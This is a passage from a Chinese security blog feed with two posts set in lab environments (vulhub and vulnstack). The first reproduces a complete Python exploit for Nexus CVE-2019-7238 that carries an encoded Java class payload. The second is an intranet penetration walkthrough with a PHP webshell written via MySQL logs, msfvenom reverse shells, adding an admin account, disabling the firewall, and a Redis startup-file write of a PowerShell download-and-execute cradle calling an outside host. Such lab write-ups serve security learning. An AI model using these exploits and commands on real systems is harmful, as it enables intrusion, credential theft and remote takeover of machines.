        <content type="html"><![CDATA[<p>以下漏洞的复现环境都是vulhub+centos。</p><h3 id="CVE-2019-7238"><a href="#CVE-2019-7238" class="headerlink" title="CVE-2019-7238"></a>CVE-2019-7238</h3><blockquote><p>未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此突破的影响。</p></blockquote><p>可以利用以下脚本：<a href="https://github.com/jas502n/CVE-2019-7238/blob/master/CVE-2019-7238.py" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-7238/blob/master/CVE-2019-7238.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Created by R17a</span></span><br><span class="line"><span class="comment"># python 3.7.4</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># import requests.packages.urllib3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># requests.packages.urllib3.disable_warnings()</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string">   _______      ________    ___   ___  __  ___      ______ ___  ____   ___  </span></span><br><span class="line"><span class="string">  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \    |____  |__ \|___ \ / _ \ </span></span><br><span class="line"><span class="string"> | |     \ \  / /| |__ ______ ) | | | || | (_) |______ / /   ) | __) | (_) |</span></span><br><span class="line"><span class="string"> | |      \ \/ / |  __|______/ /| | | || |\__, |______/ /   / / |__ &lt; &gt; _ &lt; </span></span><br><span class="line"><span class="string"> | |____   \  /  | |____    / /_| |_| || |  / /      / /   / /_ ___) | (_) |</span></span><br><span class="line"><span class="string">  \_____|   \/   |______|  |____|\___/ |_| /_/      /_/   |____|____/ \___/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        Nexus RCE &lt; 3.15.0</span></span><br><span class="line"><span class="string">                        Python By jas502n  </span></span><br><span class="line"><span class="string">             python  CVE-2019-7238.py http://10.10.20.166:8081 whoami                                                  </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">print(banner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CVE_2019_7238</span><span class="params">(url, cmd)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] == <span class="string">'/'</span>:</span><br><span class="line">        vuln_url = url + <span class="string">"service/extdirect"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        vuln_url = url + <span class="string">"/service/extdirect"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0"</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">"*/*"</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">"application/json"</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">"7244"</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">"close"</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">"no-cache"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"&#123;\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [&#123;\"sort\": [&#123;\"direction\": \"ASC\", \"property\": \"name\"&#125;], \"start\": 0, \"filter\": [&#123;\"property\": \"repositoryName\", \"value\": \"*\"&#125;, &#123;\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass)&#123;   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length())&#123;       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   &#125;;defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n    y,\\n   'Exploit.Test234',\\n    z.getBytes('latin1'),    0,\\n    3054\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'&#125;\\n\"&#125;, &#123;\"property\": \"type\", \"value\": \"jexl\"&#125;], \"limit\": 50, \"page\": 1&#125;], \"method\": \"previewAssets\"&#125;"</span> % cmd</span><br><span class="line">    r = requests.post(vuln_url, data=payload, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">"\nurl= %s\n"</span> % vuln_url)</span><br><span class="line">        print(<span class="string">"cmd= %s\n"</span> % cmd)</span><br><span class="line">        print(<span class="string">"&gt;&gt;&gt;&gt; \n"</span> + r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.116.132:8081/"</span></span><br><span class="line">    cmd = <span class="string">"cat /etc/passwd"</span></span><br><span class="line">    <span class="comment"># url = sys.argv[1]</span></span><br><span class="line">    <span class="comment"># cmd = sys.argv[2]</span></span><br><span class="line"></span><br><span class="line">CVE_2019_7238(url, cmd)</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201215200705593.png" alt="image-20201215200705593"></p>]]></content>
      
      
      <categories>
          
          <category> nexus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nexus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透靶场vulnstack系列：vulnstack1</title>
      <link href="2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/"/>
      <url>2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/</url>
      
        <content type="html"><![CDATA[<h3 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h3><p>vulnstack1：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><img src="/imgs/image-20210104092155239.png" alt="image-20210104092155239"></p><p><strong>实验环境：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">攻击者本地：192.168.247.1</span><br><span class="line">攻击者KALI：192.168.247.146</span><br><span class="line">VM1：192.168.247.133（NAT）；192.168.52.128（host-only）</span><br><span class="line">VM2：192.169.52.141（host-only）</span><br><span class="line">VM3：192.168.52.138（host-only）</span><br></pre></td></tr></table></figure><p><strong>实验工具：</strong>AntSword、Coblat Strike、MSF、msfvenom</p><p><strong>实验目的：</strong>在实践中学习内网渗透，主要为了练习，所以过程能学习到的地方都可以练一练。</p><h3 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h3><h4 id="1、目标192-168-247-133信息收集"><a href="#1、目标192-168-247-133信息收集" class="headerlink" title="1、目标192.168.247.133信息收集"></a>1、目标192.168.247.133信息收集</h4><p>端口扫描，发现存在两个开放端口80 http、3306 mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -Pn -T5 192.168.247.133</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210104093203260.png" alt="image-20210104093203260"></p><p>访问80端口是phpinfo，并从页面获取到以下信息。并且可以从页面下方测试mysql连接来进行数据库连接测试，随便输了root/root，便连上了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器：Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586</span><br><span class="line">绝对路径：C:&#x2F;phpStudy&#x2F;WWW</span><br><span class="line">探针路径：C:&#x2F;phpStudy&#x2F;WWW&#x2F;l.php</span><br><span class="line">Php：5.4.45</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210104093619989.png" alt="image-20210104093619989"></p><p>针对网站进行探测，发现存在以下页面</p><p><img src="/imgs/image-20210104093735642.png" alt="image-20210104093735642"></p><p>访问phpadmin，用root/root登录，果然进来了，发现mysql是5.5.53，并且存在其它数据库newyxcms，猜测应该存在其它没探测到的页面，先记录下，万一用得到。</p><p><img src="/imgs/image-20210104094029801.png" alt="image-20210104094029801"></p><p><img src="/imgs/image-20210104094249096.png" alt="image-20210104094249096"></p><h4 id="2、Getshell"><a href="#2、Getshell" class="headerlink" title="2、Getshell"></a>2、Getshell</h4><p>首先考虑phpmyadmin漏洞利用，参考了<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html，尝试直接写入文件来getshell失败，没有写权限，尝试用日志记录写入shell" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html，尝试直接写入文件来getshell失败，没有写权限，尝试用日志记录写入shell</a> 成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启日志记录</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">"ON"</span>;</span><br><span class="line"><span class="comment"># 查看当前的日志目录</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'general%'</span>;</span><br><span class="line"><span class="comment"># 指定日志文件，具体路径可以利用上面获取的绝对路径C:/phpStudy/WWW</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">"C:/phpStudy/WWW/tt.php"</span>;</span><br><span class="line"><span class="comment"># 写入执行代码</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_POST[tt]);?&gt;"</span></span><br></pre></td></tr></table></figure><p>访问并用蚁剑连接</p><p><img src="/imgs/image-20210104102422357.png" alt="image-20210104102422357"></p><p>Cobalt Strike上线，设置监听</p><p><img src="/imgs/image-20210104102841002.png" alt="image-20210104102841002"></p><p>生成payload</p><p><img src="/imgs/image-20210104103037015.png" alt="image-20210104103037015"></p><p>蚁剑终端执行payload，CS成功获取shell。</p><p><img src="/imgs/image-20210104103206246.png" alt="image-20210104103206246"></p><h4 id="3、本机信息收集并提权"><a href="#3、本机信息收集并提权" class="headerlink" title="3、本机信息收集并提权"></a>3、本机信息收集并提权</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo</span><br><span class="line"><span class="comment"># 发现操作系统:windos7专业版 x_64，存在域：god.org，存在另一个网卡：192.168.52.128，主机名：STU1，补丁打了4个</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210104103653614.png" alt="image-20210104103653614"></p><p><img src="/imgs/image-20210104103734658.png" alt="image-20210104103734658"></p><p>Administrator权限 提权到system。参考了<a href="https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%8F%90%E6%9D%83%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5" target="_blank" rel="noopener">狼组提权文章</a>，未打MS14-058补丁KB3000061并且适用WIN7。</p><p><img src="/imgs/image-20210104104400525.png" alt="image-20210104104400525"></p><p>用CS的MS14-058提权</p><p><img src="/imgs/image-20210104104546132.png" alt="image-20210104104546132"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 存在双网卡，存在DNS服务器 192.168.52.138,可能为域控</span></span><br></pre></td></tr></table></figure><p><strong>收集主机密码</strong></p><p>Administrator/Hongrisec@2019</p><p><img src="/imgs/image-20210104105234329.png" alt="image-20210104105234329"></p><p><strong>开启远程桌面</strong></p><p>查看3389端口是否开启</p><p><img src="/imgs/image-20210104110133518.png" alt="image-20210104110133518"></p><p>添加帐号，开启远程桌面进行链接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加账号</span></span><br><span class="line">net user test11 test@<span class="number">099</span> /add</span><br><span class="line">net localgroup administrators test11 /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"><span class="comment"># 如果反弹shell失败或者开启3389失败,需要关闭防火墙</span></span><br><span class="line">netsh advfirewall set allprofiles state off  <span class="comment"># 菜刀终端命令</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210104110543441.png" alt="image-20210104110543441"></p><p><img src="/imgs/image-20210104110555491.png" alt="image-20210104110555491"></p><p><strong>wmic本地自动化信息收集-out.html</strong></p><p><img src="/imgs/image-20210104112027050.png" alt="image-20210104112027050"></p><h4 id="4、内网信息收集"><a href="#4、内网信息收集" class="headerlink" title="4、内网信息收集"></a>4、内网信息收集</h4><h5 id="域相关信息收集"><a href="#域相关信息收集" class="headerlink" title="域相关信息收集"></a>域相关信息收集</h5><p>查询域：net view /domain</p><p><img src="/imgs/image-20210104112223072.png" alt="image-20210104112223072"></p><p>查询域内所有主机：net view /domain:god</p><p><img src="/imgs/image-20210104112244913.png" alt="image-20210104112244913"></p><p>查询所有域成员计算机列表：net group “domain computers” /domain</p><p><img src="/imgs/image-20210104112339711.png" alt="image-20210104112339711"></p><p>查找域控 机器名：nltest /DCLIST:god</p><p><img src="/imgs/image-20210104112408944.png" alt="image-20210104112408944"></p><p>查询域内用户和管理员信息：</p><p>查询所有域用户列表：net user /domain</p><p><img src="/imgs/image-20210104112433952.png" alt="image-20210104112433952"></p><p>查看域管理员：net group “domain admins” /domain</p><p><img src="/imgs/image-20210104112541347.png" alt="image-20210104112541347"></p><h5 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">192.168</span>.<span class="number">247</span>.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210104112637457.png" alt="image-20210104112637457"></p><p>或者用netbios探测</p><p><img src="/imgs/image-20210104112708473.png" alt="image-20210104112708473"></p><h5 id="探测端口存活情况"><a href="#探测端口存活情况" class="headerlink" title="探测端口存活情况"></a>探测端口存活情况</h5><p><img src="/imgs/image-20210105190802162.png" alt="image-20210105190802162"></p><h5 id="梳理目前网络情况及攻击思路"><a href="#梳理目前网络情况及攻击思路" class="headerlink" title="梳理目前网络情况及攻击思路"></a>梳理目前网络情况及攻击思路</h5><p>目前内网还有两台主机，141和138，138是域控，两台主机都开了445端口，第一想到的是可能存在MS17-010漏洞直接利用，如果利用失败，可以考虑看看80和其它端口，另外还有一点就是域控可以利用前段时间新出的漏洞CVE-2020-1472。</p><p><img src="/imgs/image-20210105191635013.png" alt="image-20210105191635013"></p><h4 id="5、横向渗透192-168-52-141"><a href="#5、横向渗透192-168-52-141" class="headerlink" title="5、横向渗透192.168.52.141"></a>5、横向渗透192.168.52.141</h4><h5 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.247.146 LPORT&#x3D;4444 -f raw &gt; 123.php</span><br><span class="line">msfconsloe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.247.133</span><br><span class="line">set lport 4444</span><br><span class="line">Run</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210106204224771.png" alt="image-20210106204224771"></p><h5 id="或者CS派生会话到MSF"><a href="#或者CS派生会话到MSF" class="headerlink" title="或者CS派生会话到MSF"></a>或者CS派生会话到MSF</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.247.146</span><br><span class="line">setlport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210106204303715.png" alt="image-20210106204303715"></p><h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210106204627812.png" alt="image-20210106204627812"></p><h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Background</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">Set srvhost 192.168.247.146</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210106204702450.png" alt="image-20210106204702450"></p><h5 id="探测并尝试利用MS17-010漏洞，利用失败"><a href="#探测并尝试利用MS17-010漏洞，利用失败" class="headerlink" title="探测并尝试利用MS17-010漏洞，利用失败"></a>探测并尝试利用MS17-010漏洞，利用失败</h5><p><img src="/imgs/image-20210106204743415.png" alt="image-20210106204743415"></p><p><img src="/imgs/image-20210106204807779.png" alt="image-20210106204807779"></p><h5 id="发现平台里面给出了MS08-067，利用成功，getshell且权限为system"><a href="#发现平台里面给出了MS08-067，利用成功，getshell且权限为system" class="headerlink" title="发现平台里面给出了MS08-067，利用成功，getshell且权限为system"></a>发现平台里面给出了MS08-067，利用成功，getshell且权限为system</h5><p><img src="/imgs/image-20210106204848059.png" alt="image-20210106204848059"></p><p><img src="/imgs/image-20210106204923573.png" alt="image-20210106204923573"></p><h5 id="尝试将MSF会话派生到CS失败了"><a href="#尝试将MSF会话派生到CS失败了" class="headerlink" title="尝试将MSF会话派生到CS失败了"></a>尝试将MSF会话派生到CS失败了</h5><p><img src="/imgs/image-20210106205035633.png" alt="image-20210106205035633"></p><h4 id="6、渗透域控"><a href="#6、渗透域控" class="headerlink" title="6、渗透域控"></a>6、渗透域控</h4><h5 id="尝试利用MS17-010攻击域控也失败了"><a href="#尝试利用MS17-010攻击域控也失败了" class="headerlink" title="尝试利用MS17-010攻击域控也失败了"></a>尝试利用MS17-010攻击域控也失败了</h5><p><img src="/imgs/image-20210106205150473.png" alt="image-20210106205150473"></p><p>DC还开放了其它端口80和88，iis服务，没有可利用之处。</p><h5 id="redis获取DC"><a href="#redis获取DC" class="headerlink" title="redis获取DC"></a>redis获取DC</h5><p>发现提示有redis，但是我扫描都没找到这个端口开放了，后来发现服务没开，进到c:\redis\开了redis服务。redis-server.exe redis.windows.conf。</p><p><img src="/imgs/image-20210112204903767.png" alt="image-20210112204903767"></p><p>利用redis写入自启动</p><p>在CS创建监听和生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210112205014287.png" alt="image-20210112205014287"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows 2008自启动目录：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">注意目录在redis要用正斜杠</span><br><span class="line">1、config set dir &quot;C:&#x2F;ProgramData&#x2F;Microsoft&#x2F;Windows&#x2F;Start Menu&#x2F;Programs&#x2F;StartUp&quot;</span><br><span class="line">2、CONFIG SET dbfilename 360start.bat</span><br><span class="line">3、set x &quot;\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.52.128:80&#x2F;111&#39;))&quot;&quot;\r\n\r\n&quot;</span><br><span class="line">4、save</span><br></pre></td></tr></table></figure><h3 id="三、其它记录"><a href="#三、其它记录" class="headerlink" title="三、其它记录"></a>三、其它记录</h3><p>YXCMS漏洞：<a href="https://blog.csdn.net/xiaoi123/article/details/82758233" target="_blank" rel="noopener">https://blog.csdn.net/xiaoi123/article/details/82758233</a></p><p><img src="/imgs/image-20210112204720337.png" 